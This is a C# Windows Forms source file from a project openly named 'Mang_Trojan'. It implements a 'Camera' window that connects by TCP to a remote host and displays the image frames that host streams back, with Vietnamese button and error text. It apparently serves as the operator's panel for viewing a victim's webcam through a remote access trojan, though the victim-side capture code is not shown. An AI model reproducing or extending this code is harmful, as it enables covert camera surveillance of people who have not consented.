using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.IO;
namespace Mang_Trojan.form
{
    public partial class Camera : Form
    {
        DoImages doImages;
        static int m_Count;
        private string ipwcserver = "127.0.0.1";
       
        public Camera(string ipserver)
        {
            InitializeComponent();
            ipwcserver = ipserver;
           
           
        }

      

        private void Camera_Load(object sender, EventArgs e)
        {
            txtServer.Text = ipwcserver;
            
        }

        private void btnPress_Click(object sender, EventArgs e)
        {
            // If the button says 'Start'
            if ((string)btnPress.Tag == "1")
            {
                // Create a new thread to receive the images
                try
                {
                    m_Count = 0;
                    timer1.Enabled = true;
                    txtMessage.Text = "";
                    doImages = new DoImages(this, Convert.ToInt32(txtPort.Text));
                    ThreadStart o = new ThreadStart(doImages.ThreadProc);
                    Thread thread = new Thread(o);
                    thread.Name = "Imaging";
                    thread.Start();
                }
                catch (Exception ex)
                {
                    txtMessage.Text = ex.Message;
                    return;
                }

                // Reset the button tag and description
                btnPress.Tag = "2";
                btnPress.Text = "Dừng";
            }
            else
            {
                Stop();
                timer1.Enabled = false;
                txtFrames.Text = m_Count.ToString();
            }
        }

        private void Stop()
        {
            // Inform the thread it should stop
            doImages.Done = true;
            doImages = null;

            // Reset the button tag and description
            btnPress.Tag = "1";
            btnPress.Text = "Bắt đầu";
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            txtFrames.Text = m_Count.ToString();
        }

        // ================================================================================================
        public class DoImages
        {
            // Abort indicator
            public bool Done;

            // Form to write to
            private Camera m_f;

            // Client connection to server
            private TcpClient tcpClient;

            // stream to read from
            private NetworkStream networkStream;

            public DoImages(Camera f, int nPort)
            {
                Done = false;
                m_f = f;

                // Connect to the server and get the stream
                tcpClient = new TcpClient(m_f.txtServer.Text, nPort);
                tcpClient.NoDelay = false;
                tcpClient.ReceiveTimeout = 5000;
                tcpClient.ReceiveBufferSize = 20000;
                networkStream = tcpClient.GetStream();
            }

            public void ThreadProc()
            {
                string s;
                int iBytesComing, iBytesRead, iOffset;
                byte[] byLength = new byte[10];
                byte[] byImage = new byte[1000];
                MemoryStream m = new MemoryStream(byImage);

                do
                {
                    try
                    {
                        // Read the fixed length string that
                        // tells the image size
                        iBytesRead = networkStream.Read(byLength, 0, 10);

                        if (iBytesRead != 10)
                        {
                            m_f.txtMessage.Text = "Không có phản hồi từ máy chủ";
                            m_f.Stop();
                            break;
                        }
                        s = Encoding.ASCII.GetString(byLength);
                        iBytesComing = Convert.ToInt32(s);

                        // Make sure our buffer is big enough
                        if (iBytesComing > byImage.Length)
                        {
                            byImage = new byte[iBytesComing];
                            m = new MemoryStream(byImage);
                            tcpClient.ReceiveBufferSize = iBytesComing + 10;
                        }
                        else
                        {
                            m.Position = 0;
                        }

                        // Read the image
                        iOffset = 0;

                        do
                        {
                            iBytesRead = networkStream.Read(byImage, iOffset, iBytesComing - iOffset);
                            if (iBytesRead != 0)
                            {
                                iOffset += iBytesRead;
                            }
                            else
                            {
                                m_f.txtMessage.Text = "Không có phản hồi từ máy chủ";
                                m_f.Stop();
                            }
                        } while ((iOffset != iBytesComing) && (!Done));


                        if (!Done)
                        {
                            // Write back a byte
                            networkStream.Write(byImage, 0, 1);

                            // Put the image on the screen
                            m_f.pictureBox1.Image = new System.Drawing.Bitmap(m);

                            // Increment the frame count
                            m_Count++;
                        }
                    }
                    catch (Exception e)
                    {
                        // If we get out of sync, we're probably toast, since
                        // there is currently no resync mechanism
                        m_f.txtMessage.Text = e.Message;
                        m_f.Stop();
                    }

                } while (!Done);

                networkStream.Close();
                tcpClient.Close();
                networkStream = null;
                tcpClient = null;
            }
        }

      
    }
}
